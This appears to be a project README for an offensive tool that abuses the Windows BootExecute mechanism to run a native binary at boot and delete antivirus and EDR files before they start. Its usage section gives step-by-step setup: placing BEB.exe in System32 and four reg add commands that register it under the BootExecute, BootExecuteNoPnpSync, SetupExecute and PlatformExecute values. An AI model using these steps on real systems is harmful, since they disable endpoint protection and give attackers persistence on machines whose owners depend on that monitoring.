# BootExecute EDR Bypass

Boot Execute allows native applications—executables with the NtProcessStartup entry point and dependencies solely on ntdll.dll—to run prior to the complete initialization of the Windows operating system. This occurs even before Windows services are launched. Historically, attackers have exploited this mechanism as a rudimentary persistence method. However, utilizing this feature requires administrative privileges, both to modify the corresponding registry key and to place the executable within the %SystemRoot%\System32 directory.

Because these native applications execute before security mechanisms are fully operational, this presents an opportunity to disrupt antivirus (AV) and endpoint detection and response (EDR) systems by deleting critical application files as we run with SYSTEM privileges.

The code contained within the project is an example demonstration of exploiting this "feature" to disable Endpoint Security Products before they have a chance to stop us.

## Usage

1. Compile binary
2. Place BEB.exe in C:\Windows\System32\
3. Add either of the following registry keys to launch your binary before win32k subsytem initialization

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\0BEB" /f
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "BootExecuteNoPnpSync" /t REG_MULTI_SZ /d "BEB" /f
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "SetupExecute" /t REG_MULTI_SZ /d "BEB" /f
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "PlatformExecute" /t REG_MULTI_SZ /d "BEB" /f
```
